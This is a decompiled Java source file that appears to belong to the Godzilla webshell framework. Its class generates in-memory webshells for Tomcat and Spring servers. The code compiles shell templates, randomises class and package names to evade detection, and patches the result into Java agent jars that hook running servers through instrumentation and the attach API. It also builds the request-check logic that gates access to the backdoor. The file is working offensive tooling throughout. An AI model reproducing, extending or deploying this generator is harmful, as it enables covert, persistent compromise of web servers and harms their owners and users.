//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package core.c2profile.template;

import com.formdev.flatlaf.util.StringUtils;
import core.EasyI18N;
import core.annotation.PropertyAnnotation;
import core.c2profile.C2ProfileContext;
import core.c2profile.C2RequestCheckType;
import core.c2profile.c2annotation.C2ProfileTemplate;
import core.c2profile.c2enum.RequestChannelEnum;
import core.c2profile.c2enum.RequestCheckEnum;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.LoaderClassPath;
import util.Javac;
import util.StringEscapeUtils;
import util.functions;

@C2ProfileTemplate(
        supportPayload = "JavaDynamicPayload",
        templateName = "MemoryShell",
        // agent.jar 已移除（2026-10-30）：agent.javax 的 {code} 占位符全工程无人替换，生成必抛
        // "内存马模板 Java 编译失败"；jar 内自带的 CoreClassLoader 参考实现也只是 hack/ccc PoC。
        // 需要 agent 路线时须先补全 agent.javax 协议体（可移植 springMemoryShell.javax 的 entry）。
        // tomcat.jar（2026-10-30 新增）：与 spring.jar 同款 agent 流程——编译产物改名 com.security.CoreClassLoader
        // 替换进 GodzillaWebAgent.jar 资源（premain/agentmain + ClassFileTransformer 钩子 + attach API），
        // 整包 com/security 随机化；equals(new Object[]{req,resp}) 契约与 tomcat 模板 entry 同构。
        supportType = {"tomcat.class", "tomcat.java", "tomcat.jar", "spring.class","spring.java", "spring.jar"}
)
public class JavaMemoryShellTemplate extends JavaJspTemplate {
    protected static final String[] packerNames = new String[]{"org", "net", "sun", "javax", "com", "dev", "us", "xyz", "gov", "edu"};
    protected static final String[] packerName2;
    @PropertyAnnotation(
            Name = "packageName",
            Value = ""
    )
    protected String packageName;
    @PropertyAnnotation(
            Name = "className",
            Value = ""
    )
    protected String className;
    protected String userSelectTemplateName;
    protected String javaCodeTemplate;
    protected boolean isGenerateClass;

    public static String randomClassName() {
        String newClassName = packerNames[functions.randomInt(packerNames.length - 1, 0)];
        newClassName = newClassName + "." + packerName2[functions.randomInt(packerName2.length - 1, 0)];
        newClassName = newClassName.toLowerCase();
        newClassName = newClassName + "." + packerName2[functions.randomInt(packerName2.length - 1, 0)];
        return newClassName;
    }

    public JavaMemoryShellTemplate(C2ProfileContext ctx, String payloadName, String templateName, HashMap options) {
        super(ctx, payloadName, "filter.class", options);
        if (ctx.requestChannelType.requestChannelEnum == RequestChannelEnum.REQUEST_RAW_BODY && ctx.requestCheck.length == 0) {
            C2RequestCheckType[] var5 = ctx.requestCheck;
            int var6 = var5.length;

            for(int var7 = 0; var7 < var6; ++var7) {
                C2RequestCheckType check = var5[var7];
                if (check.requestCheckEnum == RequestCheckEnum.POST_PARAMETER) {
                    throw new IllegalArgumentException(EasyI18N.getI18nString("当使用 RequestBody 且未设置检查类型时，若包含 POST 参数检查会与 POST 过滤冲突，可能导致 DOS"));
                }
            }
        }
        this.userSelectTemplateName = templateName;
        switch (templateName) {
            case "tomcat.class":
                this.isGenerateClass = true;
                this.javaCodeTemplate = "tomcatMemoryShell.javax";
                break;
            case "tomcat.java":
                this.isGenerateClass = false;
                this.javaCodeTemplate = "tomcatMemoryShell.javax";
                break;
            case "spring.class":
                this.isGenerateClass = true;
                this.javaCodeTemplate = "springMemoryShell.javax";
                break;
            case "spring.java":
                this.isGenerateClass = false;
                this.javaCodeTemplate = "springMemoryShell.javax";
                break;
            case "tomcat.jar":
                this.isGenerateClass = true;
                this.javaCodeTemplate = "tomcatMemoryShell.javax";
                break;
            case "spring.jar":
                this.isGenerateClass = true;
                this.javaCodeTemplate = "springMemoryShell.javax";
                break;
            default:
                throw new IllegalArgumentException(EasyI18N.getI18nString("未找到模板"));
        }
    }

    protected String requestHeader(String headerName) {
        return "byte[] requestData = getHeader(request,\"" + headerName + "\").getBytes();";
    }

    protected String requestCookie(String cookieName) {
        return "byte[] requestData = getCookie(request,\"" + cookieName + "\").getBytes();";
    }

    protected String requestUri() {
        return "byte[] requestData = getRequestURI(request).getBytes();";
    }

    protected String requestUrlParameter(String parameter) {
        return "byte[] requestData = getParameter(request,\"" + parameter + "\").getBytes();";
    }

    protected String requestPostParameter(String parameter) {
        return "byte[] requestData = getParameter(request,\"" + parameter + "\").getBytes();";
    }

    protected String requestInputStream() {
        return "    byte[] buffer = new byte[102400];    java.io.ByteArrayOutputStream bufferStream = new java.io.ByteArrayOutputStream();    InputStream inputStream = getInputStream(request);    int read = 0;    while ((read = inputStream.read(buffer))>0){        bufferStream.write(buffer,0,read);    }    this.shellBodySaved = bufferStream.toByteArray();    byte[] requestData = this.shellBodySaved;";
    }

    protected String responsePrint(byte[] data) {
        return Arrays.equals(data, this.RESPONSE_CHANNEL_BYTE_VARIABLE) ? "getOutputStream(response).write(responseData);" : "getOutputStream(response).write(base64Decode(\"" + functions.base64EncodeToString(data) + "\".getBytes()));";
    }

    protected String setResponseCookie(String name, String value) {
        String _value = "\"" + value + "\"";
        this.getClass();
        if (value.equals("GodzillaResult")) {
            _value = "new String(responseData)";
        }

        return "addCookie(response,\"" + name + "\"," + _value + ");";
    }

    protected String setResponseCode(int code) {
        return "setStatus(response," + code + ");";
    }

    protected String setResponseHeader(String name, String value) {
        String _value = "\"" + value + "\"";
        this.getClass();
        if (value.equals("GodzillaResult")) {
            _value = "new String(responseData)";
        }

        return "setHeader(response,\"" + name + "\"," + _value + ");";
    }

    protected String getTemplateName() {
        return "script/" + this.javaCodeTemplate;
    }

    public byte[] generate() throws Throwable {
        byte[] content = super.generate();
        String javaCode = new String(content);
        String checkCode = "true";
        if (this.ctx.requestCheck.length > 0) {
            StringBuilder bufferCode = new StringBuilder();

            for(int i = 0; i < this.ctx.requestCheck.length; ++i) {
                C2RequestCheckType checkType = this.ctx.requestCheck[i];
                String varValue = StringEscapeUtils.escapeJava(URLDecoder.decode(checkType.parameterValue));
                String varSrc = "";
                switch (checkType.requestCheckEnum) {
                    case GET_PARAMETER:
                        varSrc = "getParameter(request,\"{varName}\")";
                        break;
                    case HEADER:
                        varSrc = "getHeader(request,\"{varName}\")";
                        break;
                    case COOKIE:
                        varSrc = "getCookie(request,\"{varName}\")";
                        break;
                    case POST_PARAMETER:
                        varSrc = "getParameter(request,\"{varName}\")";
                }

                String contrastStr = "";
                if (!varValue.equalsIgnoreCase("null")) {
                    switch (checkType.operationEnum) {
                        case EQUAL:
                            contrastStr = "\"{varValue}\".equals({varSrc})";
                            break;
                        case NOT_EQUAL:
                            contrastStr = "!\"{varValue}\".equals({varSrc})";
                            break;
                        case LIKE:
                            contrastStr = "{varSrc}!=null&&{varSrc}.indexOf(\"{varValue}\")!=-1";
                    }
                } else {
                    switch (checkType.operationEnum) {
                        case EQUAL:
                            contrastStr = "{varSrc} == null";
                            break;
                        case NOT_EQUAL:
                            contrastStr = "{varSrc} != null";
                            break;
                        case LIKE:
                            throw new IllegalArgumentException(EasyI18N.getI18nString("模板匹配的值不能为 null"));
                    }
                }

                varSrc = varSrc.replace("{varName}", checkType.parameterName);
                contrastStr = contrastStr.replace("{varSrc}", varSrc).replace("{varValue}", StringEscapeUtils.escapeJava(varValue));
                bufferCode.append(contrastStr);
                bufferCode.append("&&");
            }

            bufferCode.deleteCharAt(bufferCode.length() - 1);
            bufferCode.deleteCharAt(bufferCode.length() - 1);
            checkCode = bufferCode.toString();
        }

        javaCode = javaCode.replace("{requestCheck}", checkCode);
        if (!this.isGenerateClass) {
            return javaCode.getBytes();
        } else {
            byte[] classBytes = Javac.compile(javaCode);
            if (classBytes == null || classBytes.length == 0) {
                throw new IllegalStateException(EasyI18N.getI18nString(
                    "\u5185\u5b58\u9a6c\u6a21\u677f Java \u7f16\u8bd1\u5931\u8d25\uff08\u8fd4\u56de\u7a7a\u5b57\u8282\u7801\uff09\u3002"
                        + "\u8bf7\u68c0\u67e5\uff1a\u672c\u673a JDK \u662f\u5426\u5b8c\u6574\u3001JAVA_HOME \u4e0e PATH \u4e2d\u53ef\u7528 javac\u3001"
                        + "\u4ee5\u53ca\u6a21\u677f\u4e0e\u5f53\u524d JDK \u7248\u672c\u662f\u5426\u5339\u914d\u3002"));
            }
            ClassPool classPool;
            CtClass ctClass;
            if (this.userSelectTemplateName.equals("spring.jar") || this.userSelectTemplateName.equals("tomcat.jar")) {
                classPool = new ClassPool(true);
                classPool.insertClassPath(new LoaderClassPath(JavaMemoryShellTemplate.class.getClassLoader()));
                ctClass = classPool.makeClass(new ByteArrayInputStream(classBytes));
                ctClass.setName("com.security.CoreClassLoader");
                classBytes = ctClass.toBytecode();
                ctClass.detach();
                String jarResource = "script/GodzillaWebAgent.jar";
                if (this.userSelectTemplateName.equals("spring.jar")) {
                    jarResource = "script/SpringWebMvcCustomMemShellAgent.jar";
                }
                ZipInputStream zipInputStream = new ZipInputStream(JavaMemoryShellTemplate.class.getResourceAsStream(jarResource));
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                ZipOutputStream zipOutputStream = new ZipOutputStream(byteArrayOutputStream);

                for(ZipEntry zipEntry = null; (zipEntry = zipInputStream.getNextEntry()) != null; zipOutputStream.closeEntry()) {
                    ZipEntry outEntry = (ZipEntry)zipEntry.clone();
                    byte[] zipEntryBytes = null;
                    if (!zipEntry.isDirectory()) {
                        zipEntryBytes = functions.readInputStream(zipInputStream);
                        if (zipEntry.getName().equals("com/security/CoreClassLoader.class")) {
                            zipEntryBytes = classBytes;
                            // 该条目内容已被替换，克隆体上残留的是源 jar 的 size/csize/crc。
                            // 源 jar 此条目未使用 data descriptor，putNextEntry 会把这些旧值直接写进
                            // local header，closeEntry 校验时即抛 ZipException: invalid entry size。
                            // 换成全新 entry（size/csize/crc 均为 -1）让 ZipOutputStream 走 data descriptor。
                            outEntry = new ZipEntry(zipEntry.getName());
                        }
                    }

                    zipOutputStream.putNextEntry(outEntry);
                    if (!zipEntry.isDirectory()) {
                        zipOutputStream.write(zipEntryBytes);
                    }
                }

                zipInputStream.close();
                zipOutputStream.finish();
                zipOutputStream.flush();
                zipOutputStream.close();
                classBytes = byteArrayOutputStream.toByteArray();
                String newJavaPackerName = packerNames[functions.randomInt(packerNames.length - 1, 0)];
                newJavaPackerName = newJavaPackerName + "/" + packerName2[functions.randomInt(packerName2.length - 1, 0)];
                newJavaPackerName = newJavaPackerName + "/" + packerName2[functions.randomInt(packerName2.length - 1, 0)];
                newJavaPackerName = newJavaPackerName.toLowerCase();
                if (!StringUtils.isEmpty(this.packageName)) {
                    newJavaPackerName = this.packageName;
                }

                classBytes = functions.replaceJarPackage(classBytes, "com/security", newJavaPackerName);
            } else {
                classPool = new ClassPool(true);
                ctClass = classPool.makeClass(new ByteArrayInputStream(classBytes));
                if (StringUtils.isEmpty(this.className)) {
                    this.className = packerName2[functions.randomInt(packerName2.length - 1, 0)];
                }

                if (StringUtils.isEmpty(this.packageName)) {
                    this.packageName = packerNames[functions.randomInt(packerNames.length - 1, 0)];
                    this.packageName = this.packageName + "." + packerName2[functions.randomInt(packerName2.length - 1, 0)];
                    this.packageName = this.packageName + "." + packerName2[functions.randomInt(packerName2.length - 1, 0)];
                    this.packageName = this.packageName.toLowerCase();
                }

                ctClass.setName(this.packageName + "." + this.className);
                classBytes = ctClass.toBytecode();
                ctClass.detach();
            }

            return classBytes;
        }
    }

    static {
        ArrayList<String> names = new ArrayList();
        InputStream in = JavaMemoryShellTemplate.class.getResourceAsStream("script/classNames.txt");
       

        try {
            ByteArrayOutputStream buffer = new ByteArrayOutputStream(1024);

            byte read;
            while((read = (byte)in.read()) != -1) {
                if (read == 10) {
                    names.add(buffer.toString().trim());
                    buffer.reset();
                } else {
                    buffer.write(read);
                }
            }
        } catch (Exception var4) {
        }

        packerName2 = (String[])names.toArray(new String[0]);
    }
}
